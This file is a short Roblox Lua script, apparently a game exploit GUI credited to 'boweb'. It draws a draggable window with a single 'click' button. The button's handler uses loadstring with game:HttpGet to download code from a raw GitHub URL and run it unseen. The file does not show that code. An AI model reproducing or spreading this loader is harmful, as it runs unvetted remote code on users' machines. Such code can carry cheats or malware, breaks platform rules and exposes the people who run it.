--made by Mat_Devv#6666

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(183, 101, 255)
Frame.Position = UDim2.new(0.369825214, 0, 0.423832893, 0)
Frame.Size = UDim2.new(0, 316, 0, 325)
Frame.Active = true
Frame.Draggable = true

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(128, 55, 255)
TextLabel.Size = UDim2.new(0, 316, 0, 50)
TextLabel.Font = Enum.Font.SciFi
TextLabel.Text = "boweb GUI"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 30.000

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(128, 55, 255)
TextLabel_2.Position = UDim2.new(0, 0, 0.846153915, 0)
TextLabel_2.Size = UDim2.new(0, 316, 0, 50)
TextLabel_2.Font = Enum.Font.SciFi
TextLabel_2.Text = "Made By boweb#0046"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextSize = 28.000

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(125, 102, 255)
TextButton.Position = UDim2.new(0.0664556995, 0, 0.212307781, 0)
TextButton.Size = UDim2.new(0, 274, 0, 184)
TextButton.Font = Enum.Font.Cartoon
TextButton.Text = "click"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextSize = 50.000
TextButton.MouseButton1Down:connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/bowebontop/site-scp/main/sad'),true))()
end)